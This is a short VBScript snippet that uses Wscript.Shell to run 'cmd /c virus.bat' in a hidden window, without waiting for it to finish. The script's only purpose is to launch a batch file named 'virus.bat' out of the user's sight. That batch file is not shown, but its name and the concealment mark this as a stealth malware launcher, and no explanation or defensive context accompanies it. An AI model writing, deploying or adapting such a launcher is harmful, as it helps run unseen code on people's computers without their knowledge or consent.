Set oShell = CreateObject ("Wscript.Shell")
Dim strArgs
strArgs = "cmd /c virus.bat"
oShell.Run strArgs, 0, false
